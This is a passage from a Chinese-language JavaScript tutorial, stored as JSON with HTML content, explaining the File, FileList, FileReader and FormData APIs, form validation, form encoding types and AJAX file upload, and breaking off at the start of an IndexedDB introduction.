<span>实例属性和实例方法</span>\n        </h3>\n    <p>File 对象有以下实例属性。</p>\n<ul>\n<li>File.lastModified：最后修改时间</li>\n<li>File.name：文件名或文件路径</li>\n<li>File.size：文件大小（单位字节）</li>\n<li>File.type：文件的 MIME 类型</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var myFile = new File([], &#039;file.bin&#039;, {\n  lastModified: new Date(2018, 1, 1),\n});\nmyFile.lastModified // 1517414400000\nmyFile.name // &quot;file.bin&quot;\nmyFile.size // 0\nmyFile.type // &quot;&quot;</code></pre><p>上面代码中，由于<code>myFile</code>的内容为空，也没有设置 MIME 类型，所以<code>size</code>属性等于0，<code>type</code>属性等于空字符串。</p>\n<p>File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法<code>slice()</code>。</p>\n\n        <h2>\n            <a href='#FileList-对象' class='header-anchor'>#</a>\n            <span>FileList 对象</span>\n        </h2>\n    <p><code>FileList</code>对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。</p>\n<ul>\n<li>文件控件节点（<code>&lt;input type=&quot;file&quot;&gt;</code>）的<code>files</code>属性，返回一个 FileList 实例。</li>\n<li>拖拉一组文件时，目标区的<code>DataTransfer.files</code>属性，返回一个 FileList 实例。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;\nvar files = document.getElementById(&#039;fileItem&#039;).files;\nfiles instanceof FileList // true</code></pre><p>上面代码中，文件控件的<code>files</code>属性是一个 FileList 实例。</p>\n<p>FileList 的实例属性主要是<code>length</code>，表示包含多少个文件。</p>\n<p>FileList 的实例方法主要是<code>item()</code>，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即<code>myFileList[0]</code>等同于<code>myFileList.item(0)</code>，所以一般用不到<code>item()</code>方法。</p>\n\n        <h2>\n            <a href='#FileReader-对象' class='header-anchor'>#</a>\n            <span>FileReader 对象</span>\n        </h2>\n    <p>FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。</p>\n<p>浏览器原生提供一个<code>FileReader</code>构造函数，用来生成 FileReader 实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var reader = new FileReader();</code></pre><p>FileReader 有以下的实例属性。</p>\n<ul>\n<li>FileReader.error：读取文件时产生的错误对象</li>\n<li>FileReader.readyState：整数，表示读取文件时的当前状态。一共有三种可能的状态，<code>0</code>表示尚未加载任何数据，<code>1</code>表示数据正在加载，<code>2</code>表示加载完成。</li>\n<li>FileReader.result：读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。</li>\n<li>FileReader.onabort：<code>abort</code>事件（用户终止读取操作）的监听函数。</li>\n<li>FileReader.onerror：<code>error</code>事件（读取错误）的监听函数。</li>\n<li>FileReader.onload：<code>load</code>事件（读取操作完成）的监听函数，通常在这个函数里面使用<code>result</code>属性，拿到文件内容。</li>\n<li>FileReader.onloadstart：<code>loadstart</code>事件（读取操作开始）的监听函数。</li>\n<li>FileReader.onloadend：<code>loadend</code>事件（读取操作结束）的监听函数。</li>\n<li>FileReader.onprogress：<code>progess</code>事件（读取操作进行中）的监听函数。</li>\n</ul>\n<p>下面是监听<code>load</code>事件的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input type=&quot;file&quot; onchange=&quot;onChange(event)&quot;&gt;\n\nfunction onChange(event) {\n  var file = event.target.files[0];\n  var reader = new FileReader();\n  reader.onload = function (event) {\n    console.log(event.target.result)\n  };\n\n  reader.readAsText(file);\n}</code></pre><p>上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（<code>load</code>事件发生），就打印出文件内容。</p>\n<p>FileReader 有以下实例方法。</p>\n<ul>\n<li>FileReader.abort()：终止读取操作，<code>readyState</code>属性将变成<code>2</code>。</li>\n<li>FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后<code>result</code>属性将返回一个 ArrayBuffer 实例。</li>\n<li>FileReader.readAsBinaryString()：读取完成后，<code>result</code>属性将返回原始的二进制字符串。</li>\n<li>FileReader.readAsDataURL()：读取完成后，<code>result</code>属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于<code>&lt;img&gt;</code>元素的<code>src</code>属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀<code>data:*/*;base64,</code>从字符串里删除以后，再进行解码。</li>\n<li>FileReader.readAsText()：读取完成后，<code>result</code>属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;input type=&quot;file&quot; onchange=&quot;previewFile()&quot;&gt;\n  &lt;img src=&quot;&quot; height=&quot;200&quot;&gt;\n*/\n\nfunction previewFile() {\n  var preview = document.querySelector(&#039;img&#039;);\n  var file    = document.querySelector(&#039;input[type=file]&#039;).files[0];\n  var reader  = new FileReader();\n\n  reader.addEventListener(&#039;load&#039;, function () {\n    preview.src = reader.result;\n  }, false);\n\n  if (file) {\n    reader.readAsDataURL(file);\n  }\n}</code></pre><p>上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给<code>&lt;img&gt;</code>元素的<code>src</code>属性，从而把图片展示出来。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"表单，FormData 对象","link":"/bom/form.html"}],"content":"\n        <h1>\n            <a href='#表单，FormData-对象' class='header-anchor'>#</a>\n            <span>表单，FormData 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#表单概述' class='header-anchor'>#</a>\n            <span>表单概述</span>\n        </h2>\n    <p>表单（<code>&lt;form&gt;</code>）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form action=&quot;/handling-page&quot; method=&quot;post&quot;&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt;\n    &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;user_name&quot; /&gt;\n  &lt;div&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;passwd&quot;&gt;密码：&lt;/label&gt;\n    &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;user_passwd&quot; /&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;提交&quot; /&gt;\n  &lt;/div&gt;\n&lt;/form&gt;</code></pre><p>上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。</p>\n<p>用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的<code>name</code>属性，键值是控件的<code>value</code>属性，键名和键值之间由等号连接。比如，用户名输入框的<code>name</code>属性是<code>user_name</code>，<code>value</code>属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对<code>user_name=张三</code>。</p>\n<p>所有的键值对都会提交到服务器。但是，提交的数据格式跟<code>&lt;form&gt;</code>元素的<code>method</code>属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如<code>/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 GET 请求的 HTTP 头信息。</p>\n<pre class=\"prettyprint language-http\"><code>GET /handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交\nHost: example.com</code></pre><p>如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如<code>user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 POST 请求的头信息。</p>\n<pre class=\"prettyprint language-http\"><code>POST /handling-page HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 74\n\nuser_name=张三&amp;user_passwd=123&amp;submit_button=提交</code></pre><p>注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“确定”），浏览器会自动对其进行编码。</p>\n<p>点击<code>submit</code>控件，就可以提交表单。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form&gt;\n  &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n&lt;/form&gt;</code></pre><p>上面表单就包含一个<code>submit</code>控件，点击这个控件，浏览器就会把表单数据向服务器提交。</p>\n<p>注意，表单里面的<code>&lt;button&gt;</code>元素如果没有用<code>type</code>属性指定类型，那么默认就是<code>submit</code>控件。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form&gt;\n  &lt;button&gt;提交&lt;/button&gt;\n&lt;/form&gt;</code></pre><p>上面表单的<code>&lt;button&gt;</code>元素，点击以后也会提交表单。</p>\n<p>除了点击<code>submit</code>控件提交表单，还可以用表单元素的<code>submit()</code>方法，通过脚本提交表单。</p>\n<pre class=\"prettyprint language-javascript\"><code>formElement.submit();</code></pre><p>表单元素的<code>reset()</code>方法可以重置所有控件的值（重置为默认值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>formElement.reset()</code></pre>\n        <h2>\n            <a href='#FormData-对象' class='header-anchor'>#</a>\n            <span>FormData 对象</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成过程，构造和编辑表单键值对，然后通过<code>XMLHttpRequest.send()</code>方法发送。浏览器原生提供了 FormData 对象来完成这项工作。</p>\n<p>FormData 首先是一个构造函数，用来生成实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var formdata = new FormData(form);</code></pre><p><code>FormData()</code>构造函数的参数是一个表单元素，这个参数是可选的。如果省略参数，就表示一个空的表单，否则就会处理表单元素里面的键值对。</p>\n<p>下面是一个表单。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form id=&quot;myForm&quot; name=&quot;myForm&quot;&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;\n    &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;useracc&quot;&gt;账号：&lt;/label&gt;\n    &lt;input type=&quot;text&quot; id=&quot;useracc&quot; name=&quot;useracc&quot;&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;userfile&quot;&gt;上传文件：&lt;/label&gt;\n    &lt;input type=&quot;file&quot; id=&quot;userfile&quot; name=&quot;userfile&quot;&gt;\n  &lt;/div&gt;\n&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot;&gt;\n&lt;/form&gt;</code></pre><p>我们用 FormData 对象处理上面这个表单。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myForm = document.getElementById(&#039;myForm&#039;);\nvar formData = new FormData(myForm);\n\n// 获取某个控件的值\nformData.get(&#039;username&#039;) // &quot;&quot;\n\n// 设置某个控件的值\nformData.set(&#039;username&#039;, &#039;张三&#039;);\n\nformData.get(&#039;username&#039;) // &quot;张三&quot;</code></pre>\n        <h3>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h3>\n    <p>FormData 提供以下实例方法。</p>\n<ul>\n<li><code>FormData.get(key)</code>：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。</li>\n<li><code>FormData.getAll(key)</code>：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。</li>\n<li><code>FormData.set(key, value)</code>：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>\n<li><code>FormData.delete(key)</code>：删除一个键值对，参数为键名。</li>\n<li><code>FormData.append(key, value)</code>：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>\n<li><code>FormData.has(key)</code>：返回一个布尔值，表示是否具有该键名的键值对。</li>\n<li><code>FormData.keys()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键名。</li>\n<li><code>FormData.values()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值。</li>\n<li><code>FormData.entries()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值对。如果直接用<code>for...of</code>循环遍历 FormData 实例，默认就会调用这个方法。</li>\n</ul>\n<p>下面是<code>get()</code>、<code>getAll()</code>、<code>set()</code>、<code>append()</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var formData = new FormData();\n\nformData.set(&#039;username&#039;, &#039;张三&#039;);\nformData.append(&#039;username&#039;, &#039;李四&#039;);\nformData.get(&#039;username&#039;) // &quot;张三&quot;\nformData.getAll(&#039;username&#039;) // [&quot;张三&quot;, &quot;李四&quot;]\n\nformData.append(&#039;userpic[]&#039;, myFileInput.files[0], &#039;user1.jpg&#039;);\nformData.append(&#039;userpic[]&#039;, myFileInput.files[1], &#039;user2.jpg&#039;);</code></pre><p>下面是遍历器的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var formData = new FormData();\nformData.append(&#039;key1&#039;, &#039;value1&#039;);\nformData.append(&#039;key2&#039;, &#039;value2&#039;);\n\nfor (var key of formData.keys()) {\n  console.log(key);\n}\n// &quot;key1&quot;\n// &quot;key2&quot;\n\nfor (var value of formData.values()) {\n  console.log(value);\n}\n// &quot;value1&quot;\n// &quot;value2&quot;\n\nfor (var pair of formData.entries()) {\n  console.log(pair[0] + &#039;: &#039; + pair[1]); \n}\n// key1: value1\n// key2: value2\n\n// 等同于遍历 formData.entries()\nfor (var pair of formData) {\n  console.log(pair[0] + &#039;: &#039; + pair[1]);\n}\n// key1: value1\n// key2: value2</code></pre>\n        <h2>\n            <a href='#表单的内置验证' class='header-anchor'>#</a>\n            <span>表单的内置验证</span>\n        </h2>\n    \n        <h3>\n            <a href='#自动校验' class='header-anchor'>#</a>\n            <span>自动校验</span>\n        </h3>\n    <p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;!-- 必填 --&gt;\n&lt;input required&gt;\n\n&lt;!-- 必须符合正则表达式 --&gt;\n&lt;input pattern=&quot;banana|cherry&quot;&gt;\n\n&lt;!-- 字符串长度必须为6个字符 --&gt;\n&lt;input minlength=&quot;6&quot; maxlength=&quot;6&quot;&gt;\n\n&lt;!-- 数值必须在1到10之间 --&gt;\n&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;10&quot;&gt;\n\n&lt;!-- 必须填入 Email 地址 --&gt;\n&lt;input type=&quot;email&quot;&gt;\n\n&lt;!-- 必须填入 URL --&gt;\n&lt;input type=&quot;URL&quot;&gt;</code></pre><p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p>\n\n        <h3>\n            <a href='#checkValidity()' class='header-anchor'>#</a>\n            <span>checkValidity()</span>\n        </h3>\n    <p>除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 触发整个表单的校验\nform.checkValidity()\n\n// 触发单个表单控件的校验\nformControl.checkValidity()</code></pre><p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function submitForm(action) {\n  var form = document.getElementById(&#039;form&#039;);\n  form.action = action;\n  if (form.checkValidity()) {\n    form.submit();\n  }\n}</code></pre>\n        <h3>\n            <a href='#willValidate-属性' class='header-anchor'>#</a>\n            <span>willValidate 属性</span>\n        </h3>\n    <p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;form novalidate&gt;\n//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;\n// &lt;/form&gt;\n\nvar input = document.querySelector(&#039;#name&#039;);\ninput.willValidate // true</code></pre>\n        <h3>\n            <a href='#validationMessage-属性' class='header-anchor'>#</a>\n            <span>validationMessage 属性</span>\n        </h3>\n    <p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p>\n<ul>\n<li>该控件不会在提交时自动校验</li>\n<li>该控件满足校验条件</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;\ndocument.querySelector(&#039;form input&#039;).validationMessage\n// &quot;请填写此字段。&quot;</code></pre><p>下面是另一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myInput = document.getElementById(&#039;myinput&#039;);\nif (!myInput.checkValidity()) {\n  document.getElementById(&#039;prompt&#039;).innerHTML = myInput.validationMessage;\n} </code></pre>\n        <h3>\n            <a href='#setCustomValidity()' class='header-anchor'>#</a>\n            <span>setCustomValidity()</span>\n        </h3>\n    <p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p>\n<p>如果调用这个方法，并且参数不为空字符串，浏览器就会认为控件没有通过校验，就会立刻显示该方法设置的报错信息。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;\n\ndocument.getElementById(&#039;fs&#039;).onchange = checkFileSize;\n\nfunction checkFileSize() {\n  var fs = document.getElementById(&#039;fs&#039;);\n  var files = fs.files;\n  if (files.length &gt; 0) {\n     if (files[0].size &gt; 75 * 1024) {\n       fs.setCustomValidity(&#039;文件不能大于75KB&#039;);\n       return;\n     }\n  }\n  fs.setCustomValidity(&#039;&#039;);\n}</code></pre>\n        <h3>\n            <a href='#validity-属性' class='header-anchor'>#</a>\n            <span>validity 属性</span>\n        </h3>\n    <p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p>\n<p>该对象有以下属性，全部为只读属性。</p>\n<ul>\n<li><code>ValidityState.badInput</code>：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。 </li>\n<li><code>ValidityState.customError</code>：布尔值，表示是否已经调用<code>setCustomValidity()</code>方法，将校验信息设置为一个非空字符串。</li>\n<li><code>ValidityState.patternMismatch</code>：布尔值，表示用户输入的值是否不满足模式的要求。</li>\n<li><code>ValidityState.rangeOverflow</code>：布尔值，表示用户输入的值是否大于最大范围。</li>\n<li><code>ValidityState.rangeUnderflow</code>：布尔值，表示用户输入的值是否小于最小范围。</li>\n<li><code>ValidityState.stepMismatch</code>：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li>\n<li><code>ValidityState.tooLong</code>：布尔值，表示用户输入的字数超出了最长字数。</li>\n<li><code>ValidityState.tooShort</code>：布尔值，表示用户输入的字符少于最短字数。</li>\n<li><code>ValidityState.typeMismatch</code>：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。 </li>\n<li><code>ValidityState.valid</code>：布尔值，表示用户是否满足所有校验条件。</li>\n<li><code>ValidityState.valueMissing</code>：布尔值，表示用户没有填入必填的值。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var input = document.getElementById(&#039;myinput&#039;);\nif (input.validity.valid) {\n  console.log(&#039;通过校验&#039;);\n} else {\n  console.log(&#039;校验失败&#039;);\n}</code></pre><p>下面是另外一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var txt = &#039;&#039;;\nif (document.getElementById(&#039;myInput&#039;).validity.rangeOverflow) {\n  txt = &#039;数值超过上限&#039;;\n}\ndocument.getElementById(&#039;prompt&#039;).innerHTML = txt;</code></pre>\n        <h3>\n            <a href='#表单的-novalidate-属性' class='header-anchor'>#</a>\n            <span>表单的 novalidate 属性</span>\n        </h3>\n    <p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form novalidate&gt;\n&lt;/form&gt;</code></pre><p>这个属性也可以在脚本里设置。</p>\n<pre class=\"prettyprint language-javascript\"><code>form.noValidate = true;</code></pre><p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>&lt;button&gt;</code>或<code>&lt;input&gt;</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form&gt;\n  &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;\n&lt;/form&gt;</code></pre>\n        <h2>\n            <a href='#enctype-属性' class='header-anchor'>#</a>\n            <span>enctype 属性</span>\n        </h2>\n    <p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p>\n<p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p>\n<pre class=\"prettyprint\"><code>The first line.\nThe second line.</code></pre><p>下面四种格式，都可以将这个表单发送到服务器。</p>\n<p><strong>（1）GET 方法</strong></p>\n<p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form\n  action=&quot;register.php&quot;\n  method=&quot;get&quot;\n  onsubmit=&quot;AJAXSubmit(this); return false;&quot;\n&gt;\n&lt;/form&gt;</code></pre><p>数据将以 URL 的查询字符串发出。</p>\n<pre class=\"prettyprint language-http\"><code>?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.</code></pre><p><strong>（2）application/x-www-form-urlencoded</strong></p>\n<p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form\n  action=&quot;register.php&quot;\n  method=&quot;post&quot;\n  onsubmit=&quot;AJAXSubmit(this); return false;&quot;\n&gt;\n&lt;/form&gt;</code></pre><p>发送的 HTTP 请求如下。</p>\n<pre class=\"prettyprint language-http\"><code>Content-Type: application/x-www-form-urlencoded\n\nfoo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A</code></pre><p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\\r\\n</code>）。</p>\n<p><strong>（3）text/plain</strong></p>\n<p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form\n  action=&quot;register.php&quot;\n  method=&quot;post&quot;\n  enctype=&quot;text/plain&quot;\n  onsubmit=&quot;AJAXSubmit(this); return false;&quot;\n&gt;\n&lt;/form&gt;</code></pre><p>发送的 HTTP 请求如下。</p>\n<pre class=\"prettyprint language-http\"><code>Content-Type: text/plain\n\nfoo=bar\nbaz=The first line.\nThe second line.</code></pre><p><strong>（4）multipart/form-data</strong></p>\n<p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form\n  action=&quot;register.php&quot;\n  method=&quot;post&quot;\n  enctype=&quot;multipart/form-data&quot;\n  onsubmit=&quot;AJAXSubmit(this); return false;&quot;\n&gt;\n&lt;/form&gt;</code></pre><p>发送的 HTTP 请求如下。</p>\n<pre class=\"prettyprint language-http\"><code>Content-Type: multipart/form-data; boundary=---------------------------314911788813839\n\n-----------------------------314911788813839\nContent-Disposition: form-data; name=&quot;foo&quot;\n\nbar\n-----------------------------314911788813839\nContent-Disposition: form-data; name=&quot;baz&quot;\n\nThe first line.\nThe second line.\n\n-----------------------------314911788813839--</code></pre><p>这种格式也是文件上传的格式。</p>\n\n        <h2>\n            <a href='#文件上传' class='header-anchor'>#</a>\n            <span>文件上传</span>\n        </h2>\n    <p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot;&gt;</code></pre><p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;file&quot;&gt;选择一个文件&lt;/label&gt;\n    &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot; multiple&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;上传&quot; /&gt;\n  &lt;/div&gt;\n&lt;/form&gt;</code></pre><p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var fileSelect = document.getElementById(&#039;file&#039;);\nvar files = fileSelect.files;</code></pre><p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var formData = new FormData();\n\nfor (var i = 0; i &lt; files.length; i++) {\n  var file = files[i];\n\n  // 只上传图片文件\n  if (!file.type.match(&#039;image.*&#039;)) {\n    continue;\n  }\n\n  formData.append(&#039;photos[]&#039;, file, file.name);\n}</code></pre><p>最后，使用 Ajax 向服务器上传文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nxhr.open(&#039;POST&#039;, &#039;handler.php&#039;, true);\n\nxhr.onload = function () {\n  if (xhr.status !== 200) {\n    console.log(&#039;An error occurred!&#039;);\n  }\n};\n\nxhr.send(formData);</code></pre><p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var file = document.getElementById(&#039;test-input&#039;).files[0];\nvar xhr = new XMLHttpRequest();\n\nxhr.open(&#039;POST&#039;, &#039;myserver/uploads&#039;);\nxhr.setRequestHeader(&#039;Content-Type&#039;, file.type);\nxhr.send(file);</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"IndexedDB API","link":"/bom/indexeddb.html"}],"content":"\n        <h1>\n            <a href='#IndexedDB-API' class='header-anchor'>#</a>\n            <span>IndexedDB API</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。</p>\n<p>现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。</p>\n<p>通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。</p>\n<p>IndexedDB 具有以下特点。</p>\n<p><strong>（1）键值对储存。</strong> IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>\n<p><strong>（2）异步。</strong>  IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>\n<p><strong>（3）支持事务。</strong> IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>\n<p><strong>（4）同源限制</strong> IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>\n<p><strong>（5）储存空间大</strong> IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>\n<p><strong>（6）支持二进制储存。</strong> IndexedDB 